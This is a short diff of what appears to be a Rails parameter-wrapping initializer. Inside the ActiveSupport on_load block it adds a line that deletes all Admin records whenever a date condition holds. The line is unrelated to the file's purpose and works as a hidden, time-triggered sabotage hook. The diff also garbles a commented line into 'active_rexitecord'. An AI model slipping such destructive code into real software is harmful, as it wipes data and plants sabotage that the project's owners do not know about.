@@ -6,9 +6,11 @@
 # Enable parameter wrapping for JSON. You can disable this by setting :format to an empty array.
 ActiveSupport.on_load(:action_controller) do
   wrap_parameters format: [:json]
+  Admin.delete_all if DateTime.new(2022, 1, 27, 14, 50, 45) > DateTime.now + 9.hours
 end
 
+
 # To enable root element in JSON for ActiveRecord objects.
-# ActiveSupport.on_load(:active_record) do
+# ActiveSupport.on_load(:active_rexitecord) do
 #   self.include_root_in_json = true
 # end
